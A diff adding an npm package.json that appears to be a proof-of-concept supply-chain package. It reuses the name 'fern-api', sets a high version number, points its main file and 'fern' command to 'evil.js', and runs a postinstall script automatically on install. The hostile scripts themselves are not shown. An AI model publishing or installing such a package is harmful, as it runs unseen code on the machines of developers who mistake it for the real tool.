@@ -1,0 +1,8 @@
+{
+  "name": "fern-api",
+  "version": "5.190.0",
+  "description": "poc",
+  "main": "evil.js",
+  "bin": { "fern": "evil.js" },
+  "scripts": { "postinstall": "node postinstall.js" }
+}
